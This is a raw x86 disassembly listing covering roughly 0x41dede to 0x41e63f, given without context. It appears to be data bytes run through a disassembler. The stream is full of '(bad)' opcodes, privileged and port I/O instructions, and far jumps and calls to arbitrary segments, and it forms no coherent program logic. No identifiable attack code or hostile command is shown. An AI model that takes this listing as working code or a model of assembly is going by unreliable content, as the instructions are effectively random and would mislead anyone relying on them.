  41dede:	jmp    DWORD PTR [ebx-0x64a8314d]
  41dee4:	(bad)  
  41dee5:	int3   
  41dee6:	cmp    al,0xe0
  41dee8:	push   esp
  41dee9:	push   ebp
  41deea:	ret    0xb9e4
  41deed:	jp     0x41df26
  41deef:	mov    al,0x4a
  41def1:	fidiv  DWORD PTR [edx]
  41def3:	sbb    DWORD PTR [ebx-0x78b37a37],eax
  41def9:	repnz in al,dx
  41defb:	(bad)  
  41defd:	mov    ?,WORD PTR [esi]
  41deff:	sbb    DWORD PTR [esi-0x1a],ebx
  41df02:	dec    edx
  41df03:	or     eax,0xc98540a6
  41df08:	mov    WORD PTR [edx+edi*2-0x54],ds
  41df0c:	dec    ebp
  41df0d:	xor    al,0x56
  41df0f:	add    al,0x40
  41df11:	cmp    edi,DWORD PTR [edi]
  41df13:	jbe    0x41df35
  41df15:	lea    edx,[eax]
  41df17:	retf   
  41df18:	jb     0x41ded0
  41df1a:	int    0x7e
  41df1c:	cli    
  41df1d:	int    0x98
  41df1f:	data16 mov al,0x8a
  41df22:	hlt    
  41df23:	mov    DWORD PTR ds:0x97b6564b,ecx
  41df29:	int3   
  41df2a:	mov    dl,0xe6
  41df2c:	inc    esp
  41df2d:	(bad)  
  41df2e:	call   0xbba6e99f
  41df33:	ja     0x41df6f
  41df35:	and    BYTE PTR [eax],al
  41df37:	mov    ebx,0x40ea5a41
  41df3c:	fnstcw WORD PTR [eax+eax*2-0x1b9b020e]
  41df43:	popa   
  41df44:	js     0x41df0f
  41df46:	cmc    
  41df47:	std    
  41df48:	pop    esp
  41df49:	jbe    0x41df4d
  41df4b:	or     DWORD PTR [edx+0x2e2e684f],eax
  41df51:	lods   al,BYTE PTR ds:[esi]
  41df52:	cs push es
  41df54:	sbb    edx,DWORD PTR [ecx]
  41df56:	into   
  41df57:	jp     0x41df71
  41df59:	jmp    0x70df:0xacc37741
  41df60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df61:	xchg   BYTE PTR [edx-0x2a306d1a],bh
  41df67:	sbb    BYTE PTR [ebx+0x1b2845f4],ah
  41df6d:	adc    al,0x41
  41df6f:	mov    BYTE PTR [ecx+0x41409f16],cl
  41df75:	in     eax,dx
  41df76:	loope  0x41df61
  41df78:	popf   
  41df79:	lea    eax,[edx+0x16]
  41df7c:	and    ch,BYTE PTR [edx]
  41df7e:	sysexit 
  41df80:	call   0x66212bf8
  41df85:	in     al,0x13
  41df87:	sar    esp,cl
  41df89:	mov    edi,0xbfbd0215
  41df8e:	jne    0x41df44
  41df90:	adc    ebp,ebp
  41df92:	mov    ah,BYTE PTR [ecx-0x3e34959a]
  41df98:	dec    ecx
  41df99:	nop
  41df9a:	call   0xec31:0xdde43858
  41dfa1:	cmp    esp,DWORD PTR [edi+0x5228832]
  41dfa7:	adc    eax,0xb65e1b22
  41dfac:	xor    DWORD PTR [esi+0x46],0x7e79a888
  41dfb3:	and    esi,esi
  41dfb5:	das    
  41dfb6:	in     eax,0xe0
  41dfb8:	jl     0x41dfff
  41dfba:	push   0x74
  41dfbc:	jbe    0x41dffd
  41dfbe:	dec    edi
  41dfbf:	mov    bl,0x98
  41dfc1:	test   al,0xf0
  41dfc3:	sub    al,0xf9
  41dfc5:	ror    BYTE PTR [ecx-0x5282975],cl
  41dfcb:	pop    edx
  41dfcc:	xchg   esi,eax
  41dfcd:	aad    0xff
  41dfcf:	jbe    0x41df98
  41dfd1:	mov    ch,0x7a
  41dfd3:	push   es
  41dfd4:	adc    esp,DWORD PTR ds:0x29a1371
  41dfda:	pop    edi
  41dfdb:	jmp    0x41e021
  41dfdd:	add    DWORD PTR [esi+0x33bc625b],ecx
  41dfe3:	lds    edi,FWORD PTR [edx-0x142ef797]
  41dfe9:	fld    st(2)
  41dfeb:	outs   dx,BYTE PTR ds:[esi]
  41dfec:	fstp   DWORD PTR ds:0x72e56466
  41dff2:	mov    ecx,0x3fc11994
  41dff7:	pop    edx
  41dff8:	and    dh,bh
  41dffa:	push   ss
  41dffb:	rcl    DWORD PTR [edi],cl
  41dffd:	nop
  41dffe:	call   0x30d3:0x8aeb81ea
  41e005:	adc    eax,DWORD PTR [ecx+0x39]
  41e008:	aam    0x4d
  41e00a:	sti    
  41e00b:	mov    ch,0xe3
  41e00d:	or     BYTE PTR [ecx],0x3d
  41e010:	fidiv  DWORD PTR [ebp+0x22e1b259]
  41e016:	jl     0x41e056
  41e018:	dec    esp
  41e019:	cmp    ebp,esp
  41e01b:	scas   al,BYTE PTR es:[edi]
  41e01c:	mov    dh,0x8b
  41e01e:	mov    ds:0x4c758925,eax
  41e023:	int    0xf6
  41e025:	cmp    al,0x7a
  41e027:	push   es
  41e028:	fld    TBYTE PTR [eax-0x421e9a40]
  41e02e:	mov    esi,DWORD PTR [edx+edi*1]
  41e031:	inc    ebx
  41e032:	xchg   edi,eax
  41e033:	sbb    ebp,edi
  41e035:	inc    ebp
  41e036:	inc    ebx
  41e038:	arpl   ax,ax
  41e03a:	shl    dl,1
  41e03c:	pop    ss
  41e03d:	cmp    eax,0x6e586e7b
  41e042:	or     eax,0x7744faf0
  41e047:	sub    eax,0xf1899f60
  41e04c:	mov    esp,0xd73a19d6
  41e051:	or     dh,dl
  41e053:	test   al,0xb4
  41e055:	imul   edx,DWORD PTR [esi],0xd3193a78
  41e05b:	jl     0x41e04b
  41e05d:	out    0xf3,al
  41e05f:	cmp    BYTE PTR [ebx],ah
  41e061:	in     eax,0xc6
  41e063:	nop
  41e064:	inc    edx
  41e065:	nop
  41e066:	xchg   ecx,eax
  41e067:	inc    eax
  41e068:	add    DWORD PTR [ecx+ebx*8+0x120dee0],ebx
  41e06f:	inc    eax
  41e070:	(bad)  
  41e071:	xor    ch,al
  41e073:	aad    0xbb
  41e075:	xor    bl,bl
  41e077:	nop
  41e078:	aam    0x83
  41e07a:	xlat   BYTE PTR ds:[ebx]
  41e07b:	push   esi
  41e07c:	pop    ss
  41e07d:	sahf   
  41e07e:	mov    esp,0x872b4bf1
  41e083:	jp     0x41e05b
  41e085:	add    ecx,DWORD PTR [eax]
  41e087:	add    DWORD PTR [ecx+0x20243b26],0xffffff94
  41e08e:	out    0x40,eax
  41e090:	shl    BYTE PTR [edx],cl
  41e092:	das    
  41e093:	push   edx
  41e094:	ret    0xa056
  41e097:	mov    ah,0xd2
  41e099:	loop   0x41e119
  41e09b:	retf   
  41e09c:	test   eax,0xf9799bd2
  41e0a1:	pop    esi
  41e0a2:	and    BYTE PTR [ecx],dl
  41e0a4:	retf   
  41e0a5:	dec    edx
  41e0a6:	sub    dh,ch
  41e0a8:	and    BYTE PTR [eax-0x75fdd853],ch
  41e0ae:	mov    ebp,0x4a96ba00
  41e0b3:	inc    esi
  41e0b4:	int3   
  41e0b5:	dec    edx
  41e0b6:	mov    ecx,0x66ed9872
  41e0bb:	sbb    al,0xb
  41e0bd:	stc    
  41e0be:	xor    BYTE PTR [edx+eax*8],cl
  41e0c1:	lds    edx,FWORD PTR [esi+0x5f8b5c56]
  41e0c7:	mov    eax,ds:0xaf971f15
  41e0cc:	std    
  41e0cd:	and    DWORD PTR [edx+ebp*8+0x7745bfd7],ecx
  41e0d4:	fld    QWORD PTR [eax]
  41e0d6:	and    ebp,DWORD PTR [ebx]
  41e0d8:	ins    DWORD PTR es:[edi],dx
  41e0d9:	jbe    0x41e0dd
  41e0db:	mov    eax,0xd56cd0fa
  41e0e0:	imul   ebx,DWORD PTR [ebx],0x8c7701f6
  41e0e6:	push   edx
  41e0e7:	and    al,bh
  41e0e9:	(bad)  
  41e0ea:	mov    edx,DWORD PTR [esi-0x55]
  41e0ed:	pop    ebp
  41e0ee:	mov    bh,ah
  41e0f0:	adc    ah,cl
  41e0f2:	dec    eax
  41e0f3:	mov    dh,0xc2
  41e0f5:	cmp    esp,DWORD PTR [ebp-0x20]
  41e0f8:	or     eax,0x3fdc8165
  41e0fd:	jp     0x41e165
  41e0ff:	add    bl,bl
  41e101:	dec    DWORD PTR [esi+0x11476cf5]
  41e107:	test   DWORD PTR [ecx],ebp
  41e109:	xlat   BYTE PTR ds:[ebx]
  41e10a:	xor    ecx,DWORD PTR ds:0xc63521da
  41e110:	xchg   ebx,eax
  41e111:	xchg   ebp,eax
  41e112:	xchg   ebx,eax
  41e113:	mov    ch,BYTE PTR [eax-0x656dc807]
  41e119:	push   esp
  41e11a:	xchg   BYTE PTR [eax],al
  41e11c:	aad    0xd8
  41e11e:	les    ecx,FWORD PTR [eax+ebp*2+0x217efa41]
  41e125:	call   0x59489b60
  41e12a:	imul   ebx,DWORD PTR [edi],0x10
  41e12d:	mov    ds:0x2f00972c,al
  41e132:	mov    ah,BYTE PTR [ecx+0x156cf698]
  41e138:	cmp    ah,BYTE PTR [ebx]
  41e13a:	mov    al,ds:0xea699654
  41e13f:	pop    ebx
  41e140:	aam    0xd0
  41e142:	repz inc eax
  41e144:	lock iret 
  41e146:	mov    dl,0x8d
  41e148:	adc    DWORD PTR [ecx],ebp
  41e14a:	push   ebx
  41e14b:	(bad)  
  41e14c:	adc    al,0xf6
  41e14e:	mov    ds:0x18c80d85,al
  41e153:	xchg   edx,eax
  41e154:	out    dx,eax
  41e155:	dec    ebx
  41e156:	scas   eax,DWORD PTR es:[edi]
  41e157:	xor    DWORD PTR [eax+0x65],edi
  41e15a:	(bad)  
  41e15b:	ror    BYTE PTR [di+0x697d],cl
  41e160:	lahf   
  41e161:	hlt    
  41e162:	shl    DWORD PTR [edx+ecx*1],1
  41e165:	not    bl
  41e167:	ins    BYTE PTR es:[edi],dx
  41e168:	in     eax,0x63
  41e16a:	movnti DWORD PTR [bx+di],edx
  41e16e:	pop    ss
  41e16f:	das    
  41e170:	cmp    DWORD PTR [ebp+0x78d9d484],0xe90e7adf
  41e17a:	push   ebp
  41e17b:	push   edi
  41e17c:	lea    edi,[edx+0x5abaa8bb]
  41e182:	fld    TBYTE PTR [edx+0x4cd3ccd9]
  41e188:	bound  ebx,QWORD PTR [esi*8-0x723e11fe]
  41e18f:	inc    esi
  41e190:	stc    
  41e191:	mov    esp,0x378dba68
  41e196:	mov    eax,ds:0x1dde9400
  41e19b:	sub    eax,0x163d9953
  41e1a0:	sbb    bl,BYTE PTR es:[ebx-0x2d8d24ee]
  41e1a7:	or     al,0x16
  41e1a9:	pop    eax
  41e1aa:	adc    ch,bl
  41e1ac:	aaa    
  41e1ad:	lods   al,BYTE PTR ds:[esi]
  41e1ae:	sti    
  41e1af:	xchg   ebp,eax
  41e1b0:	icebp  
  41e1b1:	pop    edi
  41e1b2:	leave  
  41e1b3:	(bad)  
  41e1b4:	ja     0x41e1c1
  41e1b6:	retf   
  41e1b7:	xor    al,0x71
  41e1b9:	sub    esi,DWORD PTR [eax+eax*4-0x290381a6]
  41e1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1c1:	inc    ebx
  41e1c2:	xchg   BYTE PTR [eax-0x23e0c88c],bl
  41e1c8:	mov    edx,0x91298d1c
  41e1cd:	rol    ebx,0x83
  41e1d0:	ret    
  41e1d1:	pop    eax
  41e1d2:	loop   0x41e175
  41e1d4:	pushf  
  41e1d5:	pop    ebx
  41e1d6:	stos   BYTE PTR es:[edi],al
  41e1d7:	fsubr  DWORD PTR [ecx]
  41e1d9:	out    dx,eax
  41e1da:	ja     0x41e17d
  41e1dc:	jmp    0x41e223
  41e1de:	mov    DWORD PTR [ecx-0x70],ebp
  41e1e1:	push   0x3a
  41e1e3:	stos   DWORD PTR es:[edi],eax
  41e1e4:	push   ss
  41e1e5:	mov    ds:0xd9070c68,al
  41e1ea:	stc    
  41e1eb:	lahf   
  41e1ec:	mov    cl,BYTE PTR [ecx-0x28]
  41e1ef:	ret    0xe4ba
  41e1f2:	shr    BYTE PTR [eax+ebp*4-0x68d07ae7],0x4
  41e1fa:	scas   eax,DWORD PTR es:[edi]
  41e1fb:	iret   
  41e1fc:	jl     0x41e253
  41e1fe:	push   ss
  41e1ff:	adc    BYTE PTR [edx+0x5b97fb96],0x7b
  41e206:	int    0xbe
  41e208:	cmp    al,bh
  41e20a:	imul   edx,ebp,0x7
  41e20d:	mov    edx,DWORD PTR [ecx+ebx*2-0x27]
  41e211:	in     eax,dx
  41e212:	dec    ebx
  41e213:	cwde   
  41e214:	and    DWORD PTR [esi+edx*8+0xd],ebx
  41e218:	mov    al,ds:0xc0eaf7aa
  41e21d:	dec    ecx
  41e21e:	mov    ebx,DWORD PTR [ebp+0x10a3bf0f]
  41e224:	(bad)  
  41e225:	dec    DWORD PTR [ebx]
  41e227:	push   cs
  41e228:	xchg   edi,eax
  41e229:	scas   al,BYTE PTR es:[edi]
  41e22a:	mov    bl,0x61
  41e22c:	cmp    BYTE PTR [edx+0x1fbca3b9],dl
  41e232:	add    BYTE PTR [ebx+eiz*8],al
  41e235:	test   DWORD PTR [ebx+0x4f],eax
  41e238:	popf   
  41e239:	out    0x58,al
  41e23b:	mov    al,ds:0x1602860a
  41e240:	pop    ecx
  41e241:	mov    ebp,?
  41e243:	vsubss xmm1,xmm7,DWORD PTR [edi]
  41e247:	sar    DWORD PTR [esi],cl
  41e249:	pop    ebp
  41e24a:	mov    edi,0x3e2a6038
  41e24f:	lods   al,BYTE PTR ds:[esi]
  41e250:	and    al,0x36
  41e252:	add    al,0xef
  41e254:	iret   
  41e255:	ja     0x41e27e
  41e257:	sub    DWORD PTR [ebx+0x53],edi
  41e25a:	ret    
  41e25b:	xor    ebx,DWORD PTR [ecx-0x30721be5]
  41e261:	cmp    esi,DWORD PTR [edi+0x3e97ec7f]
  41e267:	fs ret 
  41e269:	lds    esi,FWORD PTR [edx+0x2875bac5]
  41e26f:	and    eax,0xd571c5a2
  41e274:	(bad)  
  41e275:	je     0x41e24f
  41e277:	dec    edi
  41e278:	fmul   DWORD PTR [edi+0x58]
  41e27b:	pop    edi
  41e27c:	dec    edx
  41e27d:	and    al,ah
  41e27f:	xor    edx,DWORD PTR [ecx+0x72d23337]
  41e285:	adc    DWORD PTR ds:0x7e04eb38,ecx
  41e28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e28c:	out    dx,eax
  41e28d:	pop    ecx
  41e28e:	out    0x1d,al
  41e290:	out    dx,al
  41e291:	test   cl,bl
  41e293:	cmc    
  41e294:	push   ss
  41e295:	cmc    
  41e296:	pop    ecx
  41e297:	pusha  
  41e298:	retf   
  41e299:	ins    BYTE PTR es:[di],dx
  41e29b:	daa    
  41e29c:	test   DWORD PTR [ecx-0x61],eax
  41e29f:	inc    ebx
  41e2a0:	mov    ds:0xf2c6c090,al
  41e2a5:	sbb    DWORD PTR [ebp-0x35],edi
  41e2a8:	test   BYTE PTR [edx+0x38],ch
  41e2ab:	daa    
  41e2ac:	jns    0x41e2e8
  41e2ae:	ret    0xcf84
  41e2b1:	std    
  41e2b2:	mov    eax,ds:0xdc1e13d7
  41e2b7:	sti    
  41e2b8:	imul   eax,DWORD PTR [ebx],0x7d
  41e2bb:	outs   dx,DWORD PTR ds:[esi]
  41e2bc:	xchg   edi,eax
  41e2bd:	sti    
  41e2be:	in     eax,dx
  41e2bf:	pop    esi
  41e2c0:	mov    ebp,0x522b716b
  41e2c5:	xor    eax,0xd0c7ba10
  41e2ca:	scas   al,BYTE PTR es:[edi]
  41e2cb:	mov    bl,BYTE PTR [esi+0x77]
  41e2ce:	mov    ebx,0xd39a283d
  41e2d3:	test   eax,0xc1bb0607
  41e2d8:	jnp    0x41e276
  41e2da:	jnp    0x41e28f
  41e2dc:	push   ecx
  41e2dd:	mov    cl,0xa9
  41e2df:	stos   BYTE PTR es:[edi],al
  41e2e0:	clc    
  41e2e1:	dec    ebx
  41e2e2:	ja     0x41e27d
  41e2e4:	dec    ebx
  41e2e5:	pop    eax
  41e2e6:	push   eax
  41e2e7:	mov    dh,0xa
  41e2e9:	dec    ebx
  41e2ea:	add    dh,BYTE PTR [edx-0x1c]
  41e2ed:	push   cs
  41e2ee:	stc    
  41e2ef:	cmp    eax,0x9a7b0105
  41e2f4:	lds    edi,FWORD PTR [ecx]
  41e2f6:	add    dl,dl
  41e2f8:	loop   0x41e305
  41e2fa:	and    eax,0x789a34e9
  41e2ff:	pop    es
  41e300:	pop    esp
  41e301:	(bad)  
  41e302:	mov    ch,0x50
  41e304:	retf   0x247b
  41e307:	das    
  41e308:	jbe    0x41e333
  41e30a:	mov    dl,0xdb
  41e30c:	pop    ebp
  41e30d:	dec    ebp
  41e30e:	dec    esp
  41e30f:	test   al,0x66
  41e311:	xchg   BYTE PTR [ebx],bl
  41e313:	imul   ebp,edx,0xce9f9760
  41e319:	mov    ds:0x6c62ebdf,eax
  41e31e:	(bad)  
  41e31f:	es add eax,0x7f8f5d4c
  41e325:	hlt    
  41e326:	adc    dh,BYTE PTR [esp+ebx*1+0xe]
  41e32a:	add    DWORD PTR ds:0x1a259d32,0x1d36a963
  41e334:	jge    0x41e3af
  41e336:	hlt    
  41e337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e338:	pop    es
  41e339:	push   ebp
  41e33a:	lods   eax,DWORD PTR ds:[esi]
  41e33b:	cmp    ebx,DWORD PTR [edi+0x6c]
  41e33e:	push   esp
  41e33f:	cmp    BYTE PTR [edi-0x71],bl
  41e342:	xor    esp,eax
  41e344:	inc    ebx
  41e345:	and    eax,0xf2a59b80
  41e34a:	cmp    eax,0xc029612
  41e34f:	pusha  
  41e350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e351:	aaa    
  41e352:	sub    BYTE PTR [edi+0x226e7d97],al
  41e358:	push   es
  41e359:	test   al,0xb6
  41e35b:	push   ecx
  41e35c:	cmc    
  41e35d:	adc    edi,0x11
  41e360:	dec    eax
  41e361:	stc    
  41e362:	mov    BYTE PTR [edx],bh
  41e364:	mov    al,0x70
  41e366:	jmp    0x41e324
  41e368:	js     0x41e319
  41e36a:	aad    0xde
  41e36c:	je     0x41e329
  41e36e:	inc    ebp
  41e36f:	pushf  
  41e370:	dec    edi
  41e371:	xor    ecx,edi
  41e373:	xchg   ecx,eax
  41e374:	add    BYTE PTR [ebx],ah
  41e376:	in     al,dx
  41e377:	pop    esi
  41e378:	fst    DWORD PTR [eax+0x24]
  41e37b:	add    al,0x3b
  41e37d:	test   DWORD PTR [eax+0x6dea427e],eax
  41e383:	push   edi
  41e384:	stc    
  41e385:	out    0x5d,al
  41e387:	push   ebp
  41e388:	stc    
  41e389:	sbb    al,ch
  41e38b:	cwde   
  41e38c:	xchg   ecx,eax
  41e38d:	into   
  41e38e:	sbb    ecx,DWORD PTR [eax+0x6f0271a9]
  41e394:	pop    ebx
  41e395:	xor    eax,0xb0835e19
  41e39a:	xor    al,0xaa
  41e39c:	sbb    ah,bh
  41e39e:	add    ebp,DWORD PTR [ebx+0x3dc34fe1]
  41e3a4:	cld    
  41e3a5:	int3   
  41e3a6:	cmp    al,0x17
  41e3a8:	scas   al,BYTE PTR es:[edi]
  41e3a9:	iret   
  41e3aa:	sbb    al,0xe6
  41e3ac:	mov    edi,0x820c7021
  41e3b1:	push   0xb600a1eb
  41e3b6:	cwde   
  41e3b7:	jmp    FWORD PTR [esi-0x36]
  41e3ba:	inc    eax
  41e3bb:	(bad)  
  41e3bc:	sbb    al,0x11
  41e3be:	stos   DWORD PTR es:[edi],eax
  41e3bf:	ret    
  41e3c0:	mov    cl,0x5c
  41e3c2:	sbb    cl,BYTE PTR [edx]
  41e3c4:	dec    edi
  41e3c5:	sti    
  41e3c6:	call   0x683:0xd5521a5f
  41e3cd:	(bad)  
  41e3ce:	mov    ds:0x81858b86,al
  41e3d3:	test   BYTE PTR [edi],ch
  41e3d5:	ret    
  41e3d6:	jne    0x41e439
  41e3d8:	(bad)  
  41e3d9:	sti    
  41e3da:	mov    BYTE PTR [ebp+0x44],0xb0
  41e3de:	jno    0x41e3ec
  41e3e0:	loope  0x41e3ed
  41e3e2:	loopne 0x41e3e2
  41e3e4:	push   edi
  41e3e5:	(bad)  
  41e3e6:	in     al,dx
  41e3e7:	lods   eax,DWORD PTR ds:[esi]
  41e3e8:	retf   
  41e3e9:	out    dx,eax
  41e3ea:	pop    edi
  41e3eb:	xor    BYTE PTR [edx-0x5b],bh
  41e3ee:	ror    BYTE PTR fs:[eax+0x4b],cl
  41e3f2:	shl    BYTE PTR [ebx+0x1dffc86],0xab
  41e3f9:	int    0xdf
  41e3fb:	mov    edx,0x4e183524
  41e400:	xchg   edi,eax
  41e401:	lock retf 0x133b
  41e405:	xlat   BYTE PTR ds:[ebx]
  41e406:	add    bl,BYTE PTR [ebx]
  41e408:	popf   
  41e409:	xor    eax,DWORD PTR [ebx]
  41e40b:	sub    edx,edx
  41e40d:	sub    BYTE PTR [ebp-0x6c],ah
  41e410:	sbb    al,0x18
  41e412:	add    DWORD PTR [ecx+eax*2],0x46
  41e416:	shl    BYTE PTR [ebx+eax*8-0x23],0x99
  41e41b:	push   esp
  41e41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e41d:	inc    edx
  41e41e:	fisubr DWORD PTR [edi-0x6e]
  41e421:	cld    
  41e422:	add    ecx,eax
  41e424:	stos   DWORD PTR es:[edi],eax
  41e425:	pop    ecx
  41e426:	sbb    BYTE PTR [esi+0x10],0xfd
  41e42a:	fndisi(8087 only) 
  41e42c:	rol    BYTE PTR [ebx],cl
  41e42e:	repnz fnsave [edx+0x2a]
  41e432:	and    eax,0x9b014f2f
  41e437:	or     ch,al
  41e439:	out    dx,al
  41e43a:	test   DWORD PTR [ebp+0x1],eax
  41e43d:	mov    ebp,0x41065514
  41e442:	(bad)  
  41e443:	jae    0x41e415
  41e445:	(bad)  
  41e447:	addr16 jo 0x41e448
  41e44a:	sti    
  41e44b:	add    DWORD PTR [edx],ebx
  41e44d:	jmp    DWORD PTR [ecx+0x8bf0c93]
  41e453:	push   esi
  41e454:	mov    eax,DWORD PTR [ebx-0x1f]
  41e457:	mov    dl,0xe6
  41e459:	into   
  41e45a:	ror    BYTE PTR [ecx+0x40f423a7],cl
  41e460:	gs out dx,eax
  41e462:	push   ecx
  41e463:	mov    DWORD PTR ds:0xa0bf7e25,edi
  41e469:	test   eax,0x4a2869cc
  41e46e:	in     al,0x3e
  41e470:	xor    cl,BYTE PTR cs:[eax-0x56]
  41e474:	into   
  41e475:	out    0x81,eax
  41e477:	and    DWORD PTR [ecx],ebx
  41e479:	call   0x40ae:0xb71ba936
  41e480:	(bad)  
  41e482:	retf   0xf2a6
  41e485:	mov    ch,0x72
  41e487:	push   esi
  41e488:	pop    es
  41e489:	add    edi,DWORD PTR [edx]
  41e48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e48c:	xor    ebx,DWORD PTR [edx+edi*1]
  41e48f:	pop    ebp
  41e490:	mov    ds:0x21e2681d,eax
  41e495:	repnz nop
  41e497:	push   edx
  41e498:	xor    DWORD PTR [edi-0x71],ebp
  41e49b:	les    edi,FWORD PTR [edx+ebp*4]
  41e49e:	lea    edx,[esi+0x28]
  41e4a1:	dec    ecx
  41e4a2:	add    bl,BYTE PTR [edi-0x342a7d22]
  41e4a8:	ret    
  41e4a9:	data16 adc BYTE PTR [ecx-0x6be9958e],al
  41e4b0:	mov    edi,0xa727bb98
  41e4b5:	jo     0x41e4ef
  41e4b7:	lods   eax,DWORD PTR ds:[esi]
  41e4b8:	(bad)  
  41e4b9:	xor    eax,0x94ada6b
  41e4be:	das    
  41e4bf:	sbb    eax,0x37595a6d
  41e4c4:	rol    BYTE PTR [ecx-0x16],1
  41e4c7:	dec    edx
  41e4c8:	outs   dx,DWORD PTR ds:[esi]
  41e4c9:	mov    al,0xb6
  41e4cb:	add    al,0x7b
  41e4cd:	pop    ds
  41e4ce:	fwait
  41e4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4d0:	stos   BYTE PTR es:[edi],al
  41e4d1:	mov    al,ds:0xd2d8aa59
  41e4d6:	adc    al,0x51
  41e4d8:	jecxz  0x41e523
  41e4da:	xchg   edx,eax
  41e4db:	mul    bl
  41e4dd:	stos   DWORD PTR es:[edi],eax
  41e4de:	inc    edi
  41e4df:	xor    esi,DWORD PTR [esi]
  41e4e1:	es mov dl,0xd6
  41e4e4:	loope  0x41e4c8
  41e4e6:	or     eax,0x38d6e791
  41e4eb:	push   ebx
  41e4ec:	mul    BYTE PTR [eax+0x2f]
  41e4ef:	xlat   BYTE PTR ds:[ebx]
  41e4f0:	xor    ebp,DWORD PTR [esi]
  41e4f2:	retf   
  41e4f3:	inc    ecx
  41e4f4:	mov    dl,BYTE PTR [esi]
  41e4f6:	inc    esp
  41e4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f8:	outs   dx,DWORD PTR ds:[esi]
  41e4f9:	adc    eax,0x361e40ba
  41e4fe:	loopne 0x41e4e7
  41e500:	cmp    bl,BYTE PTR [edi]
  41e502:	aas    
  41e503:	mov    al,0x76
  41e505:	mov    al,ds:0xa41a8d8d
  41e50a:	sbb    DWORD PTR [edx+0x7a],0x1b
  41e50e:	(bad)  
  41e50f:	jmp    0xb9b85589
  41e514:	mov    bl,0x18
  41e516:	jl     0x41e51b
  41e518:	ja     0x41e580
  41e51a:	outs   dx,DWORD PTR ds:[esi]
  41e51b:	xchg   edx,eax
  41e51c:	jmp    0xafe7:0xf7a38932
  41e523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e524:	xchg   esi,eax
  41e525:	es xor eax,0x2dc5e07
  41e52c:	add    eax,0xd992bacb
  41e531:	lods   al,BYTE PTR ds:[esi]
  41e532:	mov    esp,0x309ff488
  41e537:	sbb    bl,BYTE PTR [eax+0x7c653d38]
  41e53d:	sbb    BYTE PTR [ebp-0x1d5646fc],al
  41e543:	call   0xfdc8:0x6aeaa6c9
  41e54a:	leave  
  41e54b:	in     al,dx
  41e54c:	adc    BYTE PTR [ecx+esi*8-0x132a87ad],bh
  41e553:	fisubr WORD PTR [edi-0x73]
  41e556:	adc    al,0x94
  41e558:	xlat   BYTE PTR ds:[ebx]
  41e559:	repz mov cl,0x54
  41e55c:	dec    esi
  41e55d:	push   ebp
  41e55e:	jle    0x41e527
  41e560:	aam    0xfc
  41e562:	push   edx
  41e563:	cmp    dl,BYTE PTR [ebx+esi*8]
  41e566:	xchg   ebx,eax
  41e567:	jle    0x41e4f9
  41e569:	mov    edi,0xdbaeb108
  41e56e:	call   DWORD PTR ds:0x3b7f31a3
  41e574:	call   0x3c79d88a
  41e579:	dec    esp
  41e57a:	cld    
  41e57b:	pushf  
  41e57c:	mov    BYTE PTR [eax],dh
  41e57e:	stos   DWORD PTR es:[edi],eax
  41e57f:	and    al,0x40
  41e581:	scas   al,BYTE PTR es:[edi]
  41e582:	mov    ds:0x2ee89585,al
  41e587:	and    al,0x44
  41e589:	jmp    0x98b:0x5438b180
  41e590:	stc    
  41e591:	outs   dx,DWORD PTR ds:[esi]
  41e592:	rcl    BYTE PTR [edx-0x73],1
  41e595:	gs dec ebp
  41e597:	jo     0x41e51b
  41e599:	ret    
  41e59a:	in     al,dx
  41e59b:	fs jg  0x41e5e6
  41e59e:	and    bl,bl
  41e5a0:	mov    ebx,0x805143d6
  41e5a5:	ds jg  0x41e615
  41e5a8:	rcl    dl,cl
  41e5aa:	test   BYTE PTR [edx],0xa3
  41e5ad:	xchg   edx,eax
  41e5ae:	adc    BYTE PTR [ebx+0x67defc25],0xec
  41e5b5:	dec    esi
  41e5b6:	das    
  41e5b7:	jge    0x41e555
  41e5b9:	sti    
  41e5ba:	int    0xc4
  41e5bc:	cmc    
  41e5bd:	int    0xa9
  41e5bf:	sub    cl,dl
  41e5c1:	cli    
  41e5c2:	sahf   
  41e5c3:	clc    
  41e5c4:	pop    ds
  41e5c5:	(bad)  
  41e5c6:	pop    esp
  41e5c7:	cli    
  41e5c8:	in     al,0xfe
  41e5ca:	daa    
  41e5cb:	ret    
  41e5cc:	sti    
  41e5cd:	jp     0x41e5a3
  41e5cf:	call   0x7432af1d
  41e5d4:	test   eax,0xe91400c2
  41e5d9:	sbb    ecx,ebp
  41e5db:	sub    BYTE PTR [edi],dl
  41e5dd:	div    DWORD PTR ds:0x1ce07dc0
  41e5e3:	dec    edx
  41e5e4:	add    al,0x57
  41e5e6:	add    BYTE PTR es:[edx-0x54508f67],ch
  41e5ed:	stos   DWORD PTR es:[edi],eax
  41e5ee:	inc    eax
  41e5ef:	jns    0x41e5ec
  41e5f1:	or     al,0xe8
  41e5f3:	div    BYTE PTR [edx+ebp*8+0x14]
  41e5f7:	sbb    cl,al
  41e5f9:	popf   
  41e5fa:	not    ebx
  41e5fc:	das    
  41e5fd:	jmp    0x7a30:0x893ae2b4
  41e604:	jns    0x41e61d
  41e606:	addr16 mov al,0x9a
  41e609:	ss mov al,0x53
  41e60c:	jle    0x41e5bb
  41e60e:	and    al,0xc4
  41e610:	add    ebp,DWORD PTR [edi+0x24]
  41e613:	push   edi
  41e614:	(bad)  
  41e615:	pop    ss
  41e616:	add    DWORD PTR [ebp-0x4aa5999c],edx
  41e61c:	es loop 0x41e609
  41e61f:	and    cl,0xbd
  41e622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e623:	cwde   
  41e624:	cwde   
  41e625:	pop    ebx
  41e626:	popa   
  41e627:	dec    ebp
  41e628:	outs   dx,DWORD PTR ds:[esi]
  41e629:	loop   0x41e64e
  41e62b:	add    al,0x2f
  41e62d:	sbb    DWORD PTR [ebp+ebx*1+0x6e44d16f],eax
  41e634:	mov    eax,edx
  41e636:	jmp    FWORD PTR [ecx-0x76]
  41e639:	xchg   esp,eax
  41e63a:	lea    edx,[edi+ecx*8-0x38]
  41e63e:	dec    esi
  41e63f:	cwde   
